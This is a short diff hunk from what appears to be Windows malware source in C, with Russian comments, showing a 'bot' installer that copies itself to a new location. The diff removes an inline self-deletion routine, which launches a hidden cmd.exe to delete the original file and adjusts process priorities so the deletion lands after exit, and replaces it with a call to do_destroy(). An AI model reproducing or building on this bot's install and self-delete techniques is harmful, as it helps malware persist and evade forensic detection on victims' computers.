@@ -40,27 +40,7 @@ static void install_bot() {
 		if (CopyFileW(path_bot, path_newbot, TRUE))
 		{
 			//выполняем самоудаление после успешного копирования
-			SHELLEXECUTEINFO sei; //инитаем структуры для процесса
-			wchar_t cmd_path[MAX_PATH]; //создаем переменную с будущим путем до cmd
-			GetEnvironmentVariableW(L"COMSPEC", cmd_path, MAX_PATH); //получаем путь до него
-			wsprintfW(cmdParametrs, L"/c del %ls > nul", path_bot); //создаем параметры для cmd под самоудаление
-			sei.cbSize = sizeof(sei);
-			sei.hwnd = 0;
-			sei.lpVerb = L"Open";
-			sei.lpFile = cmd_path; //путь до кмд
-			sei.lpParameters = cmdParametrs; //параметры запуска
-			sei.lpDirectory = 0;
-			sei.nShow = SW_HIDE;
-			sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-			//зомбайн
-			if (ShellExecuteEx(&sei))
-			{
-				SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
-				SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
-				SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
-				SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, path_bot, 0);
-				ExitProcess(0);
-			}
+			do_destroy();
 		}
 	}
 }
